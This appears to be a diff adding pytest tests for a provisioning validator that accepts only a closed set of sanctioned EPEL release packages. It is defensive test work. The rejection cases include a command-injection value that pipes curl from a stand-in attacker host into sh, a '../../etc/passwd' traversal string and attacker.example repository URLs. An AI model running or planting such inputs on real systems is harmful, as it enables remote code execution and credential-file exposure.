@@ -193,3 +193,52 @@ def test_the_refusal_says_what_is_wrong_and_what_is_acceptable():
     reader here may be an agent redrafting."""
     problems = refused(at("archive.dest", "/etc"))
     assert problems and any("/opt" in p for p in problems)
+
+
+# --- a repository that arrives as a package (C7) -------------------------------
+#
+# EPEL is enabled by installing a release package, not by fetching a .repo file,
+# so the URL rules cannot express it. A release package installs a repository
+# definition AND its signing key in one step — which is precisely why the set of
+# them is CLOSED. "Any package whose name ends in -release" would let a drafted
+# profile, or a machine's own report, nominate an arbitrary publisher and have
+# root trust it permanently for every package it will ever serve.
+#
+# This block exists because a plant test on 2026-08-23 replaced the closed-set
+# check with exactly that suffix rule and NOTHING FAILED. The rule was right and
+# nothing was holding it there.
+
+def test_the_sanctioned_release_packages_are_accepted():
+    for name in profile_rules.RELEASE_PACKAGES:
+        assert profile_rules.repo_problems({"release_package": name}) == []
+
+
+@pytest.mark.parametrize("name", [
+    "attacker-release",          # the suffix trap: shaped right, unknown publisher
+    "evil-epel-release-el9",     # a near-miss on a sanctioned name
+    "oracle-epel-release-el8",   # plausible, and not what this image trusts
+    "epel-release; curl http://attacker/x | sh",
+    "../../etc/passwd",
+    "", None, 7, [],
+])
+def test_any_other_release_package_is_refused(name):
+    """Root would trust this publisher for everything it ever serves."""
+    assert profile_rules.repo_problems({"release_package": name}), (
+        f"{name!r} would have been installed as a repository")
+
+
+def test_a_repository_may_not_be_both_a_package_and_a_url():
+    """Two repositories added under one declaration, only one of which anything
+    checked."""
+    assert profile_rules.repo_problems({
+        "release_package": "oracle-epel-release-el9",
+        "url": "https://attacker.example/x.repo",
+        "gpg_key": "https://attacker.example/gpg"})
+
+
+def test_a_release_package_repository_needs_no_separate_gpg_key():
+    """Unlike a .repo URL, where the key is a separate mandatory fetch: the
+    release package carries the key itself, and demanding one anyway would
+    make the only sanctioned no-internet repository unusable."""
+    assert profile_rules.repo_problems(
+        {"release_package": "oracle-epel-release-el9"}) == []
